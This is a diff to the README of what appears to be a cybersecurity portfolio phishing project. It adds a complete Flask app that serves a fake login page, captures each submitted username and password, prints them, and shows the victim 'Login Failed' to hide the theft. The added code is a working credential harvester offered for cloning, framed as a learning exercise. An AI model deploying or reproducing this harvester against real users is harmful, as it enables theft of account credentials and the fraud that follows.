@@ -63,3 +63,30 @@ This type of phishing attack can lead to unauthorized account access, financial 
 ```bash
 git clone https://github.com/amashicyber-a/cyber-security-portfolio.git
 cd cyber-security-portfolio/phishing-project
+
+## 💻 Project Code
+
+### 🔹 Flask Backend (app.py)
+
+This file handles the web server and captures user credentials submitted through the phishing login page.
+
+```python
+from flask import Flask, request, render_template
+
+app = Flask(__name__)
+
+@app.route('/')
+def login():
+    return render_template('index.html')
+
+@app.route('/login', methods=['POST'])
+def capture():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    print(f"[Captured] Username: {username} | Password: {password}")
+
+    return "Login Failed"
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
